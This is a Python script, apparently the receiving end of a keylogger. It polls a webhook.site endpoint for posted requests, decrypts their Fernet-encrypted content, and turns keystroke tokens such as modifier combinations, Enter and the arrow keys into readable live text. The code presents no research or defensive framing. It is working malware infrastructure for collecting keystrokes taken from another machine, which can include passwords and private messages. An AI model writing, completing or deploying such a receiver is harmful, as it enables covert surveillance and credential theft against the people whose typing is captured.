import requests
from cryptography.fernet import Fernet
import time
import re

# Configuration
WEBHOOK_ID = ""
KEY = b''
cipher_suite = Fernet(KEY)

def clean_key_display(text):
    """Clean up the key display format"""
    cleaned = text

    # Handle modifier key combinations
    cleaned = re.sub(r'<ctrl>([a-zA-Z])', r'[Ctrl+\1]', cleaned)
    cleaned = re.sub(r'<alt>([a-zA-Z])', r'[Alt+\1]', cleaned)
    cleaned = re.sub(r'<shift>([a-zA-Z])', r'[Shift+\1]', cleaned)

    # Handle special keys
    special_keys = {
        '<enter>': '[Enter]',
        '<tab>': '[Tab]',
        '<space>': ' ',
        '<backspace>': '[Backspace]',
        '<esc>': '[Esc]',
        '<up>': '[↑]',
        '<down>': '[↓]',
        '<left>': '[←]',
        '<right>': '[→]'
    }

    for key, replacement in special_keys.items():
        cleaned = cleaned.replace(key, replacement)

    return cleaned

def receive_messages():
    print("Starting webhook receiver...")
    print("Waiting for messages... (Press Ctrl+C to stop)")

    headers = {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    }

    processed_ids = set()
    current_line = ""

    while True:
        try:
            url = f"https://webhook.site/token/{WEBHOOK_ID}/requests"
            params = {
                'sorting': 'newest',
                'page': 1,
                'limit': 10
            }

            response = requests.get(url, headers=headers, params=params)

            if response.status_code == 200:
                data = response.json()
                if 'data' in data and len(data['data']) > 0:
                    for request in reversed(data['data']):
                        request_id = request['uuid']

                        if request_id not in processed_ids:
                            content = request.get('content', '')

                            if content:
                                try:
                                    if isinstance(content, str):
                                        content = content.encode('utf-8')

                                    decrypted_message = cipher_suite.decrypt(content).decode('utf-8')
                                    cleaned_message = clean_key_display(decrypted_message)

                                    # Handle line breaks
                                    if '[Enter]' in cleaned_message:
                                        lines = cleaned_message.split('[Enter]')
                                        for i, line in enumerate(lines):
                                            if i < len(lines) - 1:
                                                print(f"\r{current_line}{line}")
                                                current_line = ""
                                            else:
                                                current_line = line
                                    else:
                                        current_line = cleaned_message

                                    # Update display
                                    print(f"\rCurrent input: {current_line}", end='', flush=True)
                                    processed_ids.add(request_id)
                                except Exception as e:
                                    pass

                if len(processed_ids) > 1000:
                    processed_ids = set(list(processed_ids)[-500:])

            time.sleep(1)

        except KeyboardInterrupt:
            print("\nStopping...")
            break
        except Exception as e:
            print(f"\rConnection error: {str(e)}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        receive_messages()
    except KeyboardInterrupt:
        print("\nExiting...")
